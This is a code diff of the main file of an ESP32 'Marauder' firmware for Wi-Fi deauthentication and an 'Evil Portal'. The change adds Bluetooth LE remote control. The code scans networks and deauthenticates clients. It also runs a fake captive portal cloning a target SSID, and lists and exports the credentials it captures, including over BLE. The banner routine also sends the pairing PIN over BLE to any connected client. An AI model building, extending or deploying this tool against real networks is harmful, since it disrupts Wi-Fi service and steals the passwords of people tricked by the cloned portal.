@@ -1,230 +1,270 @@
 /**
  * ESP32 Marauder - Evil Portal + Deauth
- * Main entry point (Arduino Framework)
+ * Main Main - BLE UART Remote Control
  */
 
-#include <Arduino.h>
-#include "wifi_attack.h"
+#include "BleSerial.h"
 #include "evil_portal.h"
+#include "wifi_attack.h"
+#include <Arduino.h>
+#include <esp_wifi.h>
 
 // Version
-#define VERSION "1.0.0"
+#define VERSION "1.2.0-BLE"
 
 // Button for manual trigger
 #define BTN_TRIGGER GPIO_NUM_0
 
-void print_banner() {
-    Serial.println();
-    Serial.println("  ███╗   ███╗ █████╗ ██████╗  █████╗ ██╗   ██╗██████╗ ███████╗██████╗ ");
-    Serial.println("  ████╗ ████║██╔══██╗██╔══██╗██╔══██╗██║   ██║██╔══██╗██╔════╝██╔══██╗");
-    Serial.println("  ██╔████╔██║███████║██████╔╝███████║██║   ██║██║  ██║█████╗  ██████╔╝");
-    Serial.println("  ██║╚██╔╝██║██╔══██║██╔══██╗██╔══██║██║   ██║██║  ██║██╔══╝  ██╔══██╗");
-    Serial.println("  ██║ ╚═╝ ██║██║  ██║██║  ██║██║  ██║╚██████╔╝██████╔╝███████╗██║  ██║");
-    Serial.println("  ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝");
-    Serial.println();
-    Serial.printf("  Evil Portal + Deauth  |  v%s  |  ESP32-WROOM\n", VERSION);
-    Serial.println("  Type 'help' for commands");
-    Serial.println();
+// Global BLE Serial Instance
+BleSerial SerialBT;
+
+// Forward declarations
+void process_command(String input);
+void print_banner();
+void print_help();
+
+// --- WRAPPER FUNCTIONS FOR OUTPUT ---
+// These ensure output goes to BOTH Serial (USB) and BLE (Remote)
+
+void btPrint(const String &msg) {
+  Serial.print(msg);
+  if (SerialBT.connected()) {
+    SerialBT.print(msg);
+  }
+}
+
+void btPrintln(const String &msg) {
+  Serial.println(msg);
+  if (SerialBT.connected()) {
+    SerialBT.println(msg);
+  }
+}
+
+void btPrintf(const char *format, ...) {
+  char buffer[256];
+  va_list args;
+  va_start(args, format);
+  vsnprintf(buffer, sizeof(buffer), format, args);
+  va_end(args);
+  Serial.print(buffer);
+  if (SerialBT.connected()) {
+    SerialBT.print(buffer);
+  }
+}
+
+// --- SETUP ---
+void setup() {
+  Serial.begin(115200);
+  delay(1000);
+
+  Serial.println("\n\n=================================");
+  Serial.println("   ESP32 MARAUDER - BOOT");
+  Serial.println("=================================\n");
+
+  pinMode(BTN_TRIGGER, INPUT_PULLUP);
+
+  // 1. Initialize WiFi/Attack Modules First
+  // Critical: WiFi allocates radios. BLE comes later to share/coexist.
+  Serial.println("[*] Init WiFi Attack Module...");
+  wifi_attack_init();
+
+  // Power MGMT: Disable WiFi power save to prevent radio sleep during AP mode
+  // This is CRITICAL for Captive Portal responsiveness when BLE is active
+  esp_wifi_set_ps(WIFI_PS_NONE);
+
+  Serial.println("[*] Init Evil Portal Module...");
+  evil_portal_init();
+
+  // Give WiFi AP some time to stabilize before starting BLE radio
+  delay(2000);
+
+  // 2. Initialize BLE (NimBLE)
+  // This essentially creates a "Serial over Air" service
+  Serial.println("[BLE] Starting BLE UART Service...");
+  SerialBT.begin("ESP32-Marauder");
+  Serial.println("[BLE] OK! Name: ESP32-Marauder");
+  Serial.println("[BLE] Status: Ready to connect");
+
+  print_banner();
+}
+
+// --- LOOP ---
+void loop() {
+  // 1. Check for USB Serial Input
+  if (Serial.available()) {
+    String usbCmd = Serial.readStringUntil('\n');
+    process_command(usbCmd);
+  }
+
+  // 2. Check for BLE Serial Input
+  // BleSerial.read() acts like a stream. We buffer valid chars until newline.
+  static String bleBuffer = "";
+  while (SerialBT.available()) {
+    char c = (char)SerialBT.read();
+    if (c == '\n' || c == '\r') {
+      if (bleBuffer.length() > 0) {
+        btPrintf("[Remote] %s\n", bleBuffer.c_str());
+        process_command(bleBuffer);
+        bleBuffer = ""; // Reset buffer
+      }
+    } else {
+      // Accumulate characters
+      if (bleBuffer.length() < 128) {
+        bleBuffer += c;
+      }
+    }
+    // Prevent starvation of WiFi stack during burst reads
+    vTaskDelay(1);
+  }
+
+  // 3. Periodic Tasks
+  evil_portal_loop();
+
+  // 4. Manual Trigger Button
+  static bool lastBtnState = HIGH;
+  bool btnState = digitalRead(BTN_TRIGGER);
+  if (btnState == LOW && lastBtnState == HIGH) {
+    delay(50);
+    if (digitalRead(BTN_TRIGGER) == LOW) {
+      btPrintln("\n[*] Status Report:");
+      if (evil_portal_is_running())
+        evil_portal_status();
+      else
+        btPrintln("System Idle.");
+    }
+  }
+  lastBtnState = btnState;
+
+  delay(10); // Yield to system
+}
+
+// --- COMMAND PROCESSOR ---
+void process_command(String input) {
+  input.trim();
+  if (input.length() == 0)
+    return;
+
+  int spaceIdx = input.indexOf(' ');
+  String cmd = (spaceIdx > 0) ? input.substring(0, spaceIdx) : input;
+  String args = (spaceIdx > 0) ? input.substring(spaceIdx + 1) : "";
+
+  cmd.toLowerCase();
+  args.trim();
+
+  // === System ===
+  if (cmd == "help" || cmd == "?") {
+    print_help();
+  } else if (cmd == "reboot") {
+    btPrintln("[!] Rebooting...");
+    delay(500);
+    ESP.restart();
+  }
+
+  // === WiFi Scan ===
+  else if (cmd == "scanap") {
+    wifi_scan_start();
+  } else if (cmd == "listap") {
+    wifi_list_aps();
+  } else if (cmd == "select") {
+    if (args.length() > 0)
+      wifi_select_ap(args.toInt());
+    else
+      btPrintln("[!] Usage: select <id>");
+  }
+
+  // === Attacks ===
+  else if (cmd == "deauth") {
+    wifi_deauth_start();
+  } else if (cmd == "stop") {
+    wifi_deauth_stop();
+    evil_portal_stop();
+  }
+
+  // === Evil Portal ===
+  else if (cmd == "evilportal" || cmd == "ep") {
+    if (args.startsWith("start")) {
+      // Extract SSID if provided, else use selected
+      int firstSpace = args.indexOf(' ');
+      if (firstSpace > 0) {
+        String ssid = args.substring(firstSpace + 1);
+        // Remove quotes
+        ssid.replace("\"", "");
+        evil_portal_start(ssid.c_str());
+      } else {
+        APInfo *ap = wifi_get_selected_ap();
+        if (ap)
+          evil_portal_start(ap->ssid.c_str());
+        else
+          btPrintln("[!] Error: Select AP or provide Name");
+      }
+    } else if (args == "stop")
+      evil_portal_stop();
+    else if (args == "status")
+      evil_portal_status();
+    else if (args == "creds")
+      evil_portal_list_creds();
+    else if (args == "clear") {
+      if (SerialBT.connected() && !SerialBT.isAuthorized()) {
+        btPrintln(
+            "[!] BLE link not authorized. Pairing required to clear creds.");
+      } else {
+        evil_portal_clear_creds();
+      }
+    } else if (args == "export") {
+      // Stream captured credentials over BLE if connected, else to USB serial
+      if (SerialBT.connected()) {
+        if (!SerialBT.isAuthorized()) {
+          btPrintln(
+              "[!] BLE link not authorized. Pairing required to export creds.");
+        } else {
+          btPrintln("[Portal] Exportando credenciais via BLE...");
+          evil_portal_export_creds(SerialBT);
+          btPrintln("[Portal] Export concluido.");
+        }
+      } else {
+        btPrintln("[!] BLE nao conectado. Enviando para USB.");
+        evil_portal_export_creds(Serial);
+      }
+    } else
+      btPrintln("[!] Unknown ep command");
+  }
+
+  // === Combo Attack ===
+  else if (cmd == "attack") {
+    APInfo *ap = wifi_get_selected_ap();
+    if (ap) {
+      btPrintf("[*] Launching Attack on: %s\n", ap->ssid.c_str());
+      evil_portal_start(ap->ssid.c_str());
+      // Note: Deauth might need channel hop, handled safely?
+    } else {
+      btPrintln("[!] Select AP first.");
+    }
+  }
+
+  else {
+    btPrintln("[!] Unknown Command");
+  }
+
+  btPrint("> ");
 }
 
 void print_help() {
-    Serial.println();
-    Serial.println("=== WiFi Scan & Attack ===");
-    Serial.println("  scanap           Scan for access points");
-    Serial.println("  listap           List found APs");
-    Serial.println("  select <n>       Select AP by index");
-    Serial.println("  deauth           Start deauth attack on selected AP");
-    Serial.println("  stopscan         Stop current scan/attack");
-    Serial.println();
-    Serial.println("=== Evil Portal ===");
-    Serial.println("  evilportal start <ssid>   Start portal with SSID");
-    Serial.println("  evilportal stop           Stop portal");
-    Serial.println("  evilportal status         Show portal status");
-    Serial.println("  evilportal creds          Show captured credentials");
-    Serial.println("  evilportal clear          Clear captured credentials");
-    Serial.println("  evilportal templates      List available HTML templates");
-    Serial.println("  evilportal template <n>   Set HTML template");
-    Serial.println();
-    Serial.println("=== System ===");
-    Serial.println("  help             Show this menu");
-    Serial.println("  reboot           Restart device");
-    Serial.println();
+  btPrintln("\n=== MARAUDER REMOTE ===");
+  btPrintln("  scanap / listap / select <id>");
+  btPrintln("  deauth / stop");
+  btPrintln("  evilportal start <ssid>");
+  btPrintln("  evilportal creds / clear");
+  btPrintln("  reboot");
+  btPrintln("=======================\n");
 }
 
-// Parse command with arguments
-void process_command(String input) {
-    input.trim();
-    if (input.length() == 0) return;
-
-    // Split command and arguments
-    int spaceIdx = input.indexOf(' ');
-    String cmd = (spaceIdx > 0) ? input.substring(0, spaceIdx) : input;
-    String args = (spaceIdx > 0) ? input.substring(spaceIdx + 1) : "";
-    args.trim();
-
-    cmd.toLowerCase();
-
-    // === System Commands ===
-    if (cmd == "help" || cmd == "?") {
-        print_help();
-    }
-    else if (cmd == "reboot" || cmd == "restart") {
-        Serial.println("[*] Rebooting...");
-        delay(500);
-        ESP.restart();
-    }
-
-    // === WiFi Scan Commands ===
-    else if (cmd == "scanap") {
-        wifi_scan_start();
-    }
-    else if (cmd == "listap" || cmd == "list") {
-        wifi_list_aps();
-    }
-    else if (cmd == "select") {
-        if (args.length() == 0) {
-            Serial.println("[!] Usage: select <ap_index>");
-            return;
-        }
-        int idx = args.toInt();
-        wifi_select_ap(idx);
-    }
-
-    // === Deauth Commands ===
-    else if (cmd == "deauth") {
-        wifi_deauth_start();
-    }
-    else if (cmd == "stopscan" || cmd == "stop") {
-        wifi_deauth_stop();
-    }
-
-    // === Evil Portal Commands ===
-    else if (cmd == "evilportal" || cmd == "ep") {
-        // Parse subcommand
-        int subSpaceIdx = args.indexOf(' ');
-        String subCmd = (subSpaceIdx > 0) ? args.substring(0, subSpaceIdx) : args;
-        String subArgs = (subSpaceIdx > 0) ? args.substring(subSpaceIdx + 1) : "";
-        subArgs.trim();
-        subCmd.toLowerCase();
-
-        if (subCmd == "start") {
-            if (subArgs.length() == 0) {
-                // Try to use selected AP name
-                APInfo* ap = wifi_get_selected_ap();
-                if (ap != NULL) {
-                    evil_portal_start(ap->ssid.c_str());
-                } else {
-                    Serial.println("[!] Usage: evilportal start <ssid>");
-                    Serial.println("[!] Or select an AP first with 'select <n>'");
-                }
-            } else {
-                // Remove quotes if present
-                if (subArgs.startsWith("\"") && subArgs.endsWith("\"")) {
-                    subArgs = subArgs.substring(1, subArgs.length() - 1);
-                }
-                evil_portal_start(subArgs.c_str());
-            }
-        }
-        else if (subCmd == "stop") {
-            evil_portal_stop();
-        }
-        else if (subCmd == "status") {
-            evil_portal_status();
-        }
-        else if (subCmd == "creds" || subCmd == "credentials") {
-            evil_portal_list_creds();
-        }
-        else if (subCmd == "clear") {
-            evil_portal_clear_creds();
-        }
-        else if (subCmd == "templates" || subCmd == "list") {
-            evil_portal_list_templates();
-        }
-        else if (subCmd == "template") {
-            if (subArgs.length() == 0) {
-                Serial.println("[!] Usage: evilportal template <filename>");
-            } else {
-                evil_portal_set_template(subArgs.c_str());
-            }
-        }
-        else {
-            Serial.println("[!] Unknown subcommand. Use 'help' for commands.");
-        }
-    }
-
-    // === Quick Attack Combo ===
-    else if (cmd == "attack") {
-        // Quick attack: start deauth + evil portal together
-        APInfo* ap = wifi_get_selected_ap();
-        if (ap == NULL) {
-            Serial.println("[!] No AP selected. Run 'scanap', 'listap', then 'select <n>'");
-            return;
-        }
-
-        Serial.printf("[*] Starting combo attack on: %s\n", ap->ssid.c_str());
-
-        // Start evil portal with same SSID
-        evil_portal_start(ap->ssid.c_str());
-
-        // Note: Deauth requires switching channel, which may conflict with AP mode
-        // For now, just start the portal. Deauth needs to be run separately.
-        Serial.println("[*] Portal started. Run 'deauth' in a separate session for full effect.");
-    }
-
-    // === Unknown Command ===
-    else {
-        Serial.printf("[!] Unknown command: %s\n", cmd.c_str());
-        Serial.println("[!] Type 'help' for available commands");
-    }
-
-    Serial.print("\n> ");
-}
-
-void setup() {
-    Serial.begin(115200);
-    delay(1000);
-
-    // Configure trigger button
-    pinMode(BTN_TRIGGER, INPUT_PULLUP);
-
-    // Initialize modules
-    wifi_attack_init();
-    evil_portal_init();
-
-    // Print banner
-    print_banner();
-    Serial.print("> ");
-}
-
-void loop() {
-    // Process serial commands
-    if (Serial.available()) {
-        String cmd = Serial.readStringUntil('\n');
-        process_command(cmd);
-    }
-
-    // Process Evil Portal DNS
-    evil_portal_loop();
-
-    // Button trigger (GPIO0) - Quick demo
-    static bool lastBtnState = HIGH;
-    bool btnState = digitalRead(BTN_TRIGGER);
-
-    if (btnState == LOW && lastBtnState == HIGH) {
-        delay(50); // Debounce
-        if (digitalRead(BTN_TRIGGER) == LOW) {
-            Serial.println("\n[*] Button pressed - Quick Status:");
-            if (evil_portal_is_running()) {
-                evil_portal_status();
-            } else if (wifi_is_deauthing()) {
-                Serial.println("[*] Deauth attack in progress...");
-            } else {
-                Serial.println("[*] Idle. Type 'help' for commands.");
-            }
-            Serial.print("\n> ");
-        }
-    }
-    lastBtnState = btnState;
-
-    delay(10);
+void print_banner() {
+  btPrintln("\nESP32 MARAUDER BLE READY");
+  btPrintln("Use Serial Bluetooth Terminal");
+  // Display pairing instructions and passkey on USB serial for convenience
+  char pkbuf[64];
+  snprintf(pkbuf, sizeof(pkbuf), "Pairing PIN: %06d", BLE_PASSKEY);
+  Serial.println(pkbuf);
+  btPrintln(String("Pairing PIN: ") + String(BLE_PASSKEY));
+  btPrint("> ");
 }
